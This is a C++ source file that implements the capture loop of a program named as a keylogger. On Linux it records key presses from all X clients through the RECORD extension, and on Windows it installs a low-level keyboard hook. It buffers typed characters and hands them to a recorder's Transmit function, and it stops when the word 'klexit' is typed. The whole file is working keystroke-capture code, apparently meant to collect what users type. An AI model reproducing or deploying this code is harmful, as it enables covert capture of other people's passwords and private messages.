#include "recorder/event_loop.h"

#include <cctype>
#include <cstring>
#include <stdexcept>
#include <string>

#include "recorder/recorder.h"

static const char* kExitWord = "klexit";

static void UpdateHistoryStr(char c, std::string& history) {
  if (history.size() == std::strlen(kExitWord)) {
    history.erase(history.begin());
  }
  history += c;
}

#ifdef __linux__

#include <X11/Xlib.h>
#include <X11/Xlibint.h>
#include <X11/Xutil.h>
#include <X11/extensions/record.h>

struct CallbackData {
  ::Display* ctrl_disp = nullptr;
  ::XRecordContext* ctx = nullptr;
  keylogger::Recorder* recorder = nullptr;
};

/* Refer to libxnee. */
union XRecordDatum {
  unsigned char type;
  xEvent event;
  xResourceReq req;
  xGenericReply reply;
  xError error;
  xConnSetupPrefix setup;
};

void KeyCallback(XPointer closure, XRecordInterceptData* hook) {
  if (hook->category != XRecordFromServer) {
    ::XRecordFreeData(hook);
    return;
  }

  CallbackData* cb_data = reinterpret_cast<CallbackData*>(closure);
  XRecordDatum* data = reinterpret_cast<XRecordDatum*>(hook->data);

  int event_type = data->type;
  unsigned int key_code = data->event.u.u.detail;

  /* In order to convert the key_code into the corresponding string, we need to
   * synthesize an artificial XKeyEvent, to feed later to the XLookupString
   * function. */
  ::XKeyEvent raw_event = {
      .type = event_type,
      .serial = 0,
      .send_event = False,
      .display = cb_data->ctrl_disp,
      .window = data->event.u.focus.window,
      .root = ::XDefaultRootWindow(cb_data->ctrl_disp),
      .subwindow = None,
      .time = data->event.u.keyButtonPointer.time,
      .x = 1,
      .y = 1,
      .x_root = 1,
      .y_root = 1,
      .state = data->event.u.keyButtonPointer.state,
      .keycode = key_code,
      .same_screen = True,
  };

  /* History acts as fixed size buffer of the chars seen upto this call, it's
   * used as mechanism for finding out whether the user has entered the exit
   * string. */
  static std::string history;
  char character = '\0';
  int len = ::XLookupString(&raw_event, &character, sizeof(character), nullptr,
                            nullptr);
  switch (event_type) {
    case KeyPress:
      /* Casting std::isprint()'s argument to unsigned char as advised here:
       * https://en.cppreference.com/w/cpp/string/byte/isprint*/
      if ((len > 0) && std::isprint(static_cast<unsigned char>(character))) {
        /* Buffer printable characters, discard all others. */
        cb_data->recorder->BufferKeyPress(character);

        UpdateHistoryStr(character, history);
        if (history == kExitWord) {
          /* The exit word was typed, terminate the event loop. */
          ::XRecordDisableContext(cb_data->ctrl_disp, *cb_data->ctx);
        }
      }
      break;
    default:
      break;
  }
  ::XRecordFreeData(hook);
}

void keylogger::RecordKeyPressEvents(keylogger::Recorder* recorder) {
  ::Display* ctrl_disp = XOpenDisplay(nullptr);
  ::Display* data_disp = XOpenDisplay(nullptr);
  if (!ctrl_disp || !data_disp) {
    throw std::runtime_error("unable to open X display");
  }

  int major = 0;
  int minor = 0;
  if (!::XRecordQueryVersion(ctrl_disp, &major, &minor)) {
    throw std::runtime_error("RECORD extension not supported on this X server");
  }

  /* We must set the ctrl_disp to sync mode, or, when we enable the context
   * in data_disp, there will be a fatal X error. */
  ::XSynchronize(ctrl_disp, true);

  ::XRecordRange* record_rng = ::XRecordAllocRange();
  if (!record_rng) {
    throw std::runtime_error("could not alloc record range");
  }
  record_rng->device_events.first = KeyPress;
  record_rng->device_events.last = KeyRelease;

  ::XRecordClientSpec record_spec = XRecordAllClients;
  ::XRecordContext record_ctx =
      ::XRecordCreateContext(ctrl_disp, 0, &record_spec, 1, &record_rng, 1);
  if (!record_ctx) {
    throw std::runtime_error("could not create record context");
  }

  CallbackData cb_data{
      .ctrl_disp = ctrl_disp,
      .ctx = &record_ctx,
      .recorder = recorder,
  };
  if (!::XRecordEnableContext(data_disp, record_ctx, KeyCallback,
                              reinterpret_cast<::XPointer>(&cb_data))) {
    throw std::runtime_error("could not enable record context");
  }

  ::XRecordProcessReplies(data_disp);

  /* Flush any remaining keycodes in the recorder. */
  recorder->Transmit();

  ::XRecordFreeContext(ctrl_disp, record_ctx);
  ::XFree(record_rng);
  ::XCloseDisplay(data_disp);
  ::XCloseDisplay(ctrl_disp);
}

#elif defined(WIN32) || defined(_WIN32) || defined(__WIN32__)

#include <conio.h>
#include <windows.h>

#include <atomic>
#include <condition_variable>
#include <cstdint>
#include <mutex>
#include <thread>

static bool key_pressed = false;
static std::mutex key_pressed_mtx;
static std::condition_variable key_pressed_cv;
static std::atomic_bool exit_event_loop(false);
static char ascii_char = 0;

/* https://stackoverflow.com/questions/1387064/how-to-get-the-error-message-from-the-error-code-returned-by-getlasterror
 */
static [[nodiscard]] std::string GetLastErrorAsString() {
  DWORD error_msg_id = ::GetLastError();
  if (error_msg_id == 0) {
    return "";
  }

  LPSTR msg_buffer = nullptr;
  size_t size = ::FormatMessageA(
      FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |
          FORMAT_MESSAGE_IGNORE_INSERTS,
      nullptr, error_msg_id, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
      reinterpret_cast<LPSTR>(&msg_buffer), 0, nullptr);

  std::string message(msg_buffer, size);
  ::LocalFree(msg_buffer);

  return message;
}

char PressedAsciiChar(const KBDLLHOOKSTRUCT* kbinfo) {
  unsigned char keyboard_state[256];
  for (int i = 0; i < 256; ++i)
    keyboard_state[i] = static_cast<unsigned char>(GetKeyState(i));

  wchar_t wbuffer[3] = {0};
  int result = ::ToUnicodeEx(kbinfo->vkCode, kbinfo->scanCode, keyboard_state,
                             wbuffer, sizeof(wbuffer) / sizeof(wchar_t), 0,
                             ::GetKeyboardLayout(::GetWindowThreadProcessId(
                                 ::GetForegroundWindow(), NULL)));
  return (1 == result) ? wbuffer[0] : '\0';
}

LRESULT CALLBACK KeyCallback(int nCode, WPARAM wParam, LPARAM lParam) {
  /* History acts as fixed size buffer of the chars seen upto this call, it's
   * used as mechanism for finding out whether the user has entered the exit
   * string. */
  static std::string history;

  if (nCode < 0) {
    return ::CallNextHookEx(nullptr, nCode, wParam, lParam);
  }

  KBDLLHOOKSTRUCT* kbinfo = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
  switch (wParam) {
    case WM_KEYDOWN: {
      std::unique_lock<std::mutex> lock(key_pressed_mtx);
      key_pressed = true;
      if (exit_event_loop) {
        /* A failure in the main thread has triggered an exit. */
        ::PostQuitMessage(0);
      } else {
        ascii_char = PressedAsciiChar(kbinfo);

        UpdateHistoryStr(ascii_char, history);
        if (history == kExitWord) {
          /* The user has entered the exit string so exit. */
          exit_event_loop = true; /* Signal the main thread to exit. */
          ::PostQuitMessage(0);   /* Signal this kbd hook thread to exit. */
        }
      }
      key_pressed_cv.notify_one();
      break;
    }
    default:
      break;
  }
  return ::CallNextHookEx(nullptr, nCode, wParam, lParam);
}

void InstallHook() {
  HHOOK kbd_hook = ::SetWindowsHookEx(WH_KEYBOARD_LL, &KeyCallback, 0, 0);
  if (!kbd_hook) {
    return;
  }

  MSG message;
  while (::GetMessage(&message, nullptr, 0, 0)) {
    ::DispatchMessage(&message);
  }

  ::UnhookWindowsHookEx(kbd_hook);
}

void keylogger::RecordKeyPressEvents(keylogger::Recorder* recorder) {
  /* Launch a seperate thread hosting a low level keyboard hook. */
  std::thread kbd_event_thrd(InstallHook);

  /* Wait until signaled to exit by the keyboard hook. */
  while (!exit_event_loop) {
    std::unique_lock<std::mutex> lock(key_pressed_mtx);
    /* Wait until a key press event has occurred. */
    key_pressed_cv.wait(lock, [] { return key_pressed; });
    key_pressed = false;

    try {
      if (std::isprint(static_cast<unsigned char>(ascii_char))) {
        recorder->BufferKeyPress(ascii_char);
      }
    } catch (const std::exception& e) {
      /* Join the event handling thread. */
      exit_event_loop = true;
      /* The event thread is waiting on the key_pressed_mtx so it's important we
       * unlock it here! */
      lock.unlock();
      if (kbd_event_thrd.joinable()) {
        kbd_event_thrd.join();
      }
      /* Propagate the exception upto the caller. */
      throw e;
    }
  }

  /* Flush any remaining keycodes in the recorder. */
  recorder->Transmit();

  if (kbd_event_thrd.joinable()) {
    /* Join the event thread in the case of a normal exit. */
    kbd_event_thrd.join();
  }
}

#endif
